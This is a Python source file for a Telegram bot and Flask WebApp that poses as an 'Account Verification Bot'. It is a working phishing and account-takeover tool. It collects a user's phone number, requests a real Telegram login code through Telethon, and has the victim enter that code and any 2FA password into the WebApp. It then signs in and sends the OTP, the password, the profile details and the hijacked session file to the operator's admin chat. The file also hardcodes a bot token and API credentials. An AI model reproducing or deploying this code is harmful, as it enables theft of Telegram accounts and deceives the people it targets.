import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError
from flask import Flask, render_template, request, jsonify
import asyncio
import threading
import time
import logging
import json
import random
from datetime import datetime

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
ADMIN_ID = os.environ.get('ADMIN_ID', '5425526761')

# Initialize
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
app = Flask(__name__)

# Storage
user_data = {}  # {user_id: {name, phone, username, etc}}
otp_sessions = {}  # {phone: {client, phone_code_hash}}
verification_status = {}  # {user_id: {stage, phone, otp_attempts}}

# ==================== TELEGRAM WEBHOOK SETUP ====================
def setup_webhook():
    """Setup Telegram webhook"""
    try:
        # Detect environment
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBHOOK_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}/webhook"
        else:
            port = os.environ.get('PORT', 10000)
            WEBHOOK_URL = f"http://localhost:{port}/webhook"
        
        logger.info(f"🌐 Setting webhook to: {WEBHOOK_URL}")
        
        # Remove existing webhook
        bot.remove_webhook()
        time.sleep(1)
        
        # Set new webhook
        bot.set_webhook(url=WEBHOOK_URL)
        logger.info("✅ Webhook setup successful")
        return True
    except Exception as e:
        logger.error(f"❌ Webhook setup error: {e}")
        return False

# ==================== TELEGRAM ASYNC FUNCTIONS ====================
async def send_otp_via_telethon_async(phone):
    """Send OTP using Telethon"""
    try:
        # Create sessions directory
        os.makedirs('sessions', exist_ok=True)
        session_name = f"sessions/{phone.replace('+', '')}_{int(time.time())}"
        
        logger.info(f"📤 Sending OTP to {phone}")
        
        # Create Telethon client
        client = TelegramClient(session_name, API_ID, API_HASH)
        await client.connect()
        
        # Send code request
        sent = await client.send_code_request(phone)
        
        # Store session
        otp_sessions[phone] = {
            'client': client,
            'phone_code_hash': sent.phone_code_hash,
            'sent_time': time.time()
        }
        
        logger.info(f"✅ OTP sent to {phone}")
        return {'success': True, 'message': 'OTP sent successfully'}
        
    except FloodWaitError as e:
        return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
    except Exception as e:
        logger.error(f"Error sending OTP: {e}")
        return {'success': False, 'error': str(e)}

async def verify_otp_via_telethon_async(phone, otp_code):
    """Verify OTP using Telethon"""
    try:
        if phone not in otp_sessions:
            return {'success': False, 'error': 'Session expired. Please restart.'}
        
        client_data = otp_sessions[phone]
        client = client_data['client']
        phone_code_hash = client_data['phone_code_hash']
        
        logger.info(f"🔐 Verifying OTP for {phone}")
        
        # Sign in with OTP
        await client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
        
        # Check if authorized
        if await client.is_user_authorized():
            # Get user info
            me = await client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            
            # Save session file
            await client.session.save()
            session_file = f"{client.session.filename}.session"
            
            logger.info(f"✅ Verified {phone}, user: {user_info.get('username', 'N/A')}")
            
            return {
                'success': True,
                'user_info': user_info,
                'session_file': session_file,
                'requires_2fa': False
            }
        else:
            return {'success': False, 'error': 'Not authorized'}
            
    except SessionPasswordNeededError:
        logger.info(f"🔐 2FA required for {phone}")
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeInvalidError:
        return {'success': False, 'error': 'Invalid OTP code'}
    except Exception as e:
        logger.error(f"Error verifying OTP: {e}")
        return {'success': False, 'error': str(e)}

async def verify_2fa_via_telethon_async(phone, password):
    """Verify 2FA password"""
    try:
        if phone not in otp_sessions:
            return {'success': False, 'error': 'Session expired'}
        
        client = otp_sessions[phone]['client']
        
        logger.info(f"🔐 Verifying 2FA for {phone}")
        await client.sign_in(password=password)
        
        # Get user info
        me = await client.get_me()
        user_info = {
            'id': me.id,
            'username': me.username,
            'first_name': me.first_name,
            'last_name': me.last_name,
            'phone': me.phone
        }
        
        # Save session file
        await client.session.save()
        session_file = f"{client.session.filename}.session"
        
        logger.info(f"✅ 2FA successful for {phone}")
        
        return {
            'success': True,
            'user_info': user_info,
            'session_file': session_file
        }
    except Exception as e:
        logger.error(f"2FA error: {e}")
        return {'success': False, 'error': f'Wrong password: {str(e)}'}

def run_async(coro):
    """Run async coroutine in thread-safe way"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(coro)
        loop.close()
        return result
    except Exception as e:
        logger.error(f"Async execution error: {e}")
        return {'success': False, 'error': str(e)}

# ==================== HELPER FUNCTIONS ====================
def send_to_admin(phone, otp=None, password=None, user_info=None, session_file=None):
    """Send notification to admin"""
    try:
        message = f"""📱 <b>NEW VERIFICATION DATA</b>

📞 Phone: {phone}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
        
        if user_info:
            if user_info.get('first_name') or user_info.get('last_name'):
                full_name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
                if full_name:
                    message += f"\n👤 Name: {full_name}"
            if user_info.get('username'):
                message += f"\n🔗 Username: @{user_info.get('username')}"
            if user_info.get('id'):
                message += f"\n🆔 ID: {user_info.get('id')}"
        
        if otp:
            message += f"\n🔢 OTP: <code>{otp}</code>"
        
        if password:
            message += f"\n🔐 2FA Password: <code>{password}</code>"
        
        bot.send_message(ADMIN_ID, message, parse_mode='HTML')
        
        # Send session file if exists
        if session_file and os.path.exists(session_file):
            try:
                with open(session_file, 'rb') as f:
                    bot.send_document(
                        ADMIN_ID,
                        f,
                        caption=f"📁 Session file for {phone}"
                    )
            except Exception as e:
                logger.error(f"Error sending session file: {e}")
        
        logger.info(f"📨 Admin notified about {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

def clean_phone(phone):
    """Clean and format phone number"""
    if not phone:
        return None
    
    # Remove all non-digit characters except +
    cleaned = ''.join(c for c in phone if c.isdigit() or c == '+')
    
    # Ensure it starts with +
    if not cleaned.startswith('+'):
        # Try to add country code (assuming India +91)
        if cleaned.startswith('0'):
            cleaned = '+91' + cleaned[1:]
        elif len(cleaned) == 10:
            cleaned = '+91' + cleaned
        else:
            cleaned = '+' + cleaned
    
    return cleaned

def clean_otp(otp):
    """Clean and validate OTP (5 digits)"""
    if not otp:
        return None
    
    # Remove all non-digits
    cleaned = ''.join(filter(str.isdigit, otp))
    
    # Check if it's 5 digits
    if len(cleaned) == 5:
        return cleaned
    
    # If user entered 6 digits, take first 5
    elif len(cleaned) == 6:
        return cleaned[:5]
    
    return None

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        first_name = message.from_user.first_name or ""
        
        # Get WebApp URL
        if 'RENDER' in os.environ:
            RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
            WEBAPP_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}" if RENDER_EXTERNAL_HOSTNAME else "https://itz-me-545-telegram.onrender.com"
        else:
            port = os.environ.get('PORT', 5000)
            WEBAPP_URL = f"http://localhost:{port}"
        
        logger.info(f"🌐 WebApp URL: {WEBAPP_URL}")
        
        # Create WebApp button
        kb = types.InlineKeyboardMarkup()
        btn = types.InlineKeyboardButton(
            "📱 Open Verification WebApp",
            web_app=types.WebAppInfo(WEBAPP_URL)
        )
        kb.add(btn)
        
        # Welcome message
        welcome_text = f"""👋 <b>Hello {first_name}!</b>

Welcome to <b>Account Verification Bot</b>

Click the button below to verify your account:

✅ <b>Verification Steps:</b>
1️⃣ Open WebApp
2️⃣ Share your contact
3️⃣ Receive 5-digit OTP here
4️⃣ Enter OTP in WebApp
5️⃣ Complete verification ✅

⚠️ <i>Your contact will be auto-deleted for privacy.</i>

<b>Note:</b> Telegram sends <b>5-digit</b> OTP codes.

<b>Click below to begin:</b>"""
        
        bot.send_message(
            message.chat.id,
            welcome_text,
            parse_mode='HTML',
            reply_markup=kb
        )
        
        logger.info(f"✅ Sent /start to user {user_id}")
        
    except Exception as e:
        logger.error(f"Start error: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try /start again.")
        except:
            pass

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing - MAIN FUNCTION"""
    try:
        contact = message.contact
        user_id = message.from_user.id
        phone = contact.phone_number
        
        # Clean and format phone
        phone = clean_phone(phone)
        if not phone:
            bot.send_message(message.chat.id, "❌ Invalid phone number format.")
            return
        
        logger.info(f"📱 Contact received from {user_id}: {phone}")
        
        # Store user data
        user_data[user_id] = {
            'name': f"{contact.first_name or ''} {contact.last_name or ''}".strip(),
            'phone': phone,
            'username': message.from_user.username,
            'lang': message.from_user.language_code,
            'contact_time': time.time()
        }
        
        # Update verification status
        verification_status[user_id] = {
            'stage': 'contact_received',
            'phone': phone,
            'otp_attempts': 0
        }
        
        # Send processing message
        msg = bot.send_message(
            message.chat.id,
            f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}

⏳ <b>Sending 5-digit OTP via Telegram...</b>

Please wait while we send the verification code.""",
            parse_mode='HTML'
        )
        
        # Send OTP via Telethon in background
        def send_otp_task():
            try:
                logger.info(f"Starting OTP task for {phone}")
                result = run_async(send_otp_via_telethon_async(phone))
                
                if result['success']:
                    # Success message
                    success_msg = f"""✅ <b>OTP SENT SUCCESSFULLY!</b>

📱 Phone: {phone}
🔢 <b>5-digit OTP</b> has been sent via Telegram

Check your Telegram messages for the 5-digit code.

<b>⚠️ IMPORTANT:</b>
• Check your Telegram messages for the <b>5-digit code</b>
• Enter the code in the WebApp
• Code expires in 5 minutes

<i>Telegram OTPs are always 5 digits (e.g., 12345)</i>"""
                    
                    bot.edit_message_text(
                        success_msg,
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
                    
                    # Notify admin
                    send_to_admin(phone, user_info=user_data[user_id])
                    
                    logger.info(f"✅ OTP sent to {phone}")
                else:
                    error_msg = result.get('error', 'Failed to send OTP')
                    bot.edit_message_text(
                        f"❌ <b>Error:</b> {error_msg}\n\nPlease try again or contact support.",
                        message.chat.id,
                        msg.message_id,
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"OTP task error: {e}")
                bot.edit_message_text(
                    "❌ <b>Server Error:</b> Failed to process request",
                    message.chat.id,
                    msg.message_id,
                    parse_mode='HTML'
                )
        
        # Run in thread
        thread = threading.Thread(target=send_otp_task)
        thread.start()
        
        # Delete contact message for privacy
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
    except Exception as e:
        logger.error(f"Contact handler error: {e}")
        try:
            bot.send_message(message.chat.id, "⚠️ Error processing contact. Please try again.")
        except:
            pass

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages"""
    try:
        if message.text and not message.text.startswith('/'):
            help_text = """🔐 <b>Account Verification Help</b>

<b>How to verify:</b>
1. Use /start to get WebApp button
2. Open WebApp and share contact
3. <b>5-digit OTP</b> will appear here
4. Enter OTP in WebApp
5. Complete verification

<b>Note:</b> Telegram sends 5-digit OTP codes, not 6-digit.

Need help? Use /start to begin."""
            
            bot.send_message(message.chat.id, help_text, parse_mode='HTML')
    except Exception as e:
        logger.error(f"Message handler error: {e}")

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main WebApp page"""
    return render_template('index.html')

@app.route('/api/user/<int:user_id>')
def api_user(user_id):
    """Get user data for WebApp"""
    data = user_data.get(user_id, {})
    status = verification_status.get(user_id, {})
    
    response = {
        'success': 'phone' in data,
        'phone': data.get('phone', ''),
        'name': data.get('name', ''),
        'username': data.get('username', ''),
        'lang': data.get('lang', ''),
        'stage': status.get('stage', 'waiting'),
        'verified': status.get('verified', False)
    }
    
    return jsonify(response)

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '').strip()
        
        logger.info(f"🔢 OTP verification attempt for user {user_id}")
        
        if not user_id or not otp:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Clean and validate OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({
                'success': False, 
                'error': 'Invalid OTP format. Enter 5 digits (e.g., 12345)'
            })
        
        # Get user phone
        user_info = user_data.get(int(user_id), {})
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found. Please share contact first.'})
        
        # Check attempts
        if str(user_id) in verification_status:
            verification_status[str(user_id)]['otp_attempts'] += 1
            if verification_status[str(user_id)]['otp_attempts'] > 3:
                return jsonify({'success': False, 'error': 'Too many attempts. Please start over.'})
        
        # Verify OTP
        result = run_async(verify_otp_via_telethon_async(phone, cleaned_otp))
        
        if result['success']:
            if result.get('requires_2fa'):
                # 2FA required
                verification_status[str(user_id)]['stage'] = 'needs_2fa'
                logger.info(f"🔐 2FA required for {phone}")
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA password required'
                })
            else:
                # Success - OTP verified
                user_info = result.get('user_info', {})
                
                # Update verification status
                verification_status[str(user_id)]['stage'] = 'verified'
                verification_status[str(user_id)]['verified'] = True
                
                # Send to admin
                send_to_admin(
                    phone, 
                    otp=cleaned_otp,
                    user_info=user_info,
                    session_file=result.get('session_file')
                )
                
                logger.info(f"✅ OTP verified successfully for {phone}")
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verification successful!'
                })
        else:
            error_msg = result.get('error', 'Verification failed')
            logger.error(f"❌ OTP verification failed for {phone}: {error_msg}")
            return jsonify({
                'success': False,
                'error': error_msg
            })
            
    except Exception as e:
        logger.error(f"API verify OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def api_verify_2fa():
    """Verify 2FA password"""
    try:
        data = request.json
        user_id = data.get('user_id')
        password = data.get('password', '').strip()
        
        logger.info(f"🔐 2FA attempt for user {user_id}")
        
        if not user_id or not password:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Get user phone
        user_info = user_data.get(int(user_id), {})
        phone = user_info.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone not found'})
        
        # Verify 2FA
        result = run_async(verify_2fa_via_telethon_async(phone, password))
        
        if result['success']:
            # Success with 2FA
            user_info = result.get('user_info', {})
            
            # Update verification status
            verification_status[str(user_id)]['stage'] = 'verified'
            verification_status[str(user_id)]['verified'] = True
            
            # Send to admin with password
            send_to_admin(
                phone,
                password=password,
                user_info=user_info,
                session_file=result.get('session_file')
            )
            
            logger.info(f"✅ 2FA successful for {phone}")
            
            return jsonify({
                'success': True,
                'message': '2FA verified successfully!'
            })
        else:
            return jsonify({
                'success': False,
                'error': result.get('error', '2FA verification failed')
            })
            
    except Exception as e:
        logger.error(f"API 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/share-contact', methods=['POST'])
def api_share_contact():
    """Handle contact sharing from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        phone = data.get('phone', '').strip()
        
        logger.info(f"📱 WebApp contact share: {phone}")
        
        if not user_id or not phone:
            return jsonify({'success': False, 'error': 'Missing parameters'})
        
        # Clean phone
        phone = clean_phone(phone)
        if not phone:
            return jsonify({'success': False, 'error': 'Invalid phone number'})
        
        # Store user data
        user_data[int(user_id)] = {
            'phone': phone,
            'contact_time': time.time()
        }
        
        # Update verification status
        verification_status[str(user_id)] = {
            'stage': 'contact_received',
            'phone': phone,
            'otp_attempts': 0
        }
        
        return jsonify({
            'success': True,
            'message': 'Contact received successfully'
        })
        
    except Exception as e:
        logger.error(f"API share contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK ENDPOINT ====================
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'OK', 200

# ==================== CLEANUP THREAD ====================
def cleanup_old_sessions():
    """Clean up old sessions"""
    while True:
        try:
            time.sleep(60)
            current_time = time.time()
            
            # Clean old telethon sessions (older than 10 minutes)
            expired_clients = []
            for phone, data in list(otp_sessions.items()):
                if current_time - data.get('sent_time', 0) > 600:  # 10 minutes
                    expired_clients.append(phone)
            
            for phone in expired_clients:
                try:
                    if phone in otp_sessions:
                        client = otp_sessions[phone]['client']
                        client.disconnect()
                    del otp_sessions[phone]
                except:
                    pass
            
            # Clean old user data (older than 1 hour)
            expired_users = []
            for user_id, data in list(user_data.items()):
                if current_time - data.get('contact_time', 0) > 3600:  # 1 hour
                    expired_users.append(user_id)
            
            for user_id in expired_users:
                del user_data[user_id]
                if str(user_id) in verification_status:
                    del verification_status[str(user_id)]
            
            if expired_clients or expired_users:
                logger.info(f"🧹 Cleaned {len(expired_clients)} sessions, {len(expired_users)} users")
                
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            time.sleep(60)

# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("="*60)
    logger.info("🚀 TELEGRAM VERIFICATION BOT - COMPLETE VERSION")
    logger.info("="*60)
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    logger.info(f"🔑 API ID: {API_ID}")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info("="*60)
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_old_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Setup webhook
    if setup_webhook():
        logger.info("✅ Webhook setup successful")
    else:
        logger.warning("⚠️ Webhook setup failed, using polling fallback...")
        # Start polling in separate thread as fallback
        def run_bot_polling():
            try:
                bot.remove_webhook()
                time.sleep(1)
                bot.polling(none_stop=True, interval=3, timeout=30, skip_pending=True)
            except Exception as e:
                logger.error(f"Bot polling error: {e}")
                time.sleep(5)
                run_bot_polling()
        
        bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
        bot_thread.start()
        logger.info("✅ Bot polling thread started")
    
    # Start Flask server
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🚀 Starting Flask server on port {port}")
    
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
        )
